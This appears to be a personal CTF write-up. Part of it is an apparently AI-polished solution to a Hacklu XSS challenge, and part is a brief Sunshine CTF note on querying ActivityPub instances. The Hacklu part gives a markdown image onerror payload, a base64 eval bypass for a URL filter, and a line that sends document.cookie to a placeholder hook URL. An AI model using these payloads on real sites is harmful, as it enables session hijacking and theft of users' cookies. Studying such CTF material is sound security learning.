Learnt thing from Hacklu:
Here's a more structured and polished write-up for the challenge:

---

## Challenge: XSS Cookie Exfiltration

In this Hacklu CTF challenge, we solved an XSS (Cross-Site Scripting) cookie exfiltration task. Here’s a breakdown of the challenge and how we approached solving it.

### Challenge Breakdown

The challenge consisted of crafting an XSS payload to:
1. **Inject XSS via markdown input**: The XSS payload needed to pass through a markdown parser, which meant we couldn’t use standard HTML directly.
2. **Bypass a URL replacement function**: The system used a custom function to replace any URLs in our payload with local URLs, blocking external requests for exfiltration.
3. **Use `innerHTML` injection**: After the markdown parsing and URL replacement, the payload was rendered using `innerHTML`, making it vulnerable to XSS if crafted correctly.

### Initial Steps: Markdown XSS Payload

In markdown, images follow this format:

```markdown
![alt text](image_url)
```

Since `innerHTML` renders the final output, we can inject JavaScript by leveraging an `onerror` event in the image tag. Our goal was to trigger an alert as proof of concept.

#### Proof of Concept Payload

```markdown
**![catshttps://onerror=alert(1)//]()**
```

**Explanation**:
- **`![catshttps://onerror=alert(1)//]()`**: This markdown syntax is processed as an image. The broken URL (`catshttps://...`) triggers the `onerror` event, executing `alert(1)` in the browser.

This confirmed that we had achieved XSS execution. The next step was to use this exploit to exfiltrate cookies.

### Cookie Exfiltration

To exfiltrate the cookies, we aimed to encode our payload in a way that would bypass the URL replacement function. Instead of including the URL directly, we base64-encoded it.

The exfiltration payload in JavaScript looks like this:
```javascript
window.open(`{HOOK_URL}?x=${btoa(document.cookie)}`);
```

### Final Payload

Using the initial proof of concept, we adapted the payload to base64 encoding:

```markdown
**![catshttps://onerror=eval(atob('d2l=='))//]()**
```

Here:
- **`eval(atob('d2l=='))`**: This decodes and evaluates our base64-encoded payload.
- **`d2l==`**: This is a placeholder for the base64-encoded payload, which, when decoded, opens our hook URL to exfiltrate the cookie.

### Summary

1. We used a markdown-formatted image with an `onerror` attribute to trigger JavaScript.
2. Bypassed the URL replacement function by base64 encoding the payload.
3. Successfully exfiltrated the cookie using a hook URL encoded as base64.

--- 

This structured approach allowed us to achieve the desired cookie exfiltration through XSS, circumventing the challenge’s URL restriction with encoded payloads.

# Sunshine CTF
The more interesting thing learnt was from Sunshine CTF where we had to interact with accounts on fedi instances which used ActivityPub,a decentralized social networking protocol.
We had to read the docs and figure out how to interact with users on a particular instances set up for the CTF. The main thing was using a particular Accept header when sending the request: `'Accept': 'application/activity+json'`.

Also after the ctf got over got to know about https://browser.pub/ which is a directoy of fedi instances and could have helped us get the flag directly because it was just in the profile page of the user directly.
